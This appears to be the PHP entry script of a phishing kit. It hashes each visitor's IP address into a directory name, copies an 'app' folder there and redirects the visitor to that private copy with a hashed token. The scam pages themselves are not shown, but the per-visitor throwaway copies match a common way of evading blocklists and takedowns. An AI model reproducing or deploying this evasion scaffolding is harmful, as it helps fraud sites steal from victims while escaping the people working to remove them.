<?php

session_start(); 

    function RECURSE_COPY ( $home , $DIR ) {
        $dir = opendir( $home );
        @mkdir ( $DIR );
        while(false !== ( $file = readdir($dir)) ) {
            if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
        } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
        closedir($dir);
    }


        $_SESSION['DISPATCH']       =  substr( md5( md5( $_SERVER['REMOTE_ADDR'] ) ) , 22 );
        $_SESSION['DISPATCH_MD5_3'] = md5($_SESSION['DISPATCH'].$_SESSION['DISPATCH'].$_SESSION['DISPATCH']); 
        
        recurse_copy( 'app'      , $_SESSION['DISPATCH'] );
        header("LOCATION: {$_SESSION['DISPATCH']}/index?dispatch={$_SESSION['DISPATCH_MD5_3']}");
